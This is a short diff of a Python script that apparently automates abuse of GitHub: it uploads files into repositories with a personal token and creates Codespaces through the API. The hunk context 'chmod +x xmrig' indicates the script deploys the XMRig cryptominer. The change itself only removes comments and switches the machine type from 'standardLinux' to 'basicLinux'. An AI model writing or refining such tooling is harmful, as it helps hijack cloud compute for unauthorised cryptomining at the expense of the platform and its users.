@@ -57,9 +57,8 @@ chmod +x xmrig
         for fname, content in files.items():
             upload_file(github_token, username, repo_name, fname, content)
 
-        time.sleep(8)  # wait for GitHub to recognize new repo
+        time.sleep(8)
 
-        # 🔥 Fix: Use repository_id instead of "username/repo"
         repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers).json()
         repo_id = repo_data.get("id")
         if not repo_id:
@@ -72,7 +71,7 @@ chmod +x xmrig
                 "repository_id": repo_id,
                 "ref": "main",
                 "location": "WestUs2",
-                "machine": "standardLinux"
+                "machine": "basicLinux"
             }
         )
         print("[Codespace]", resp.status_code, resp.text)
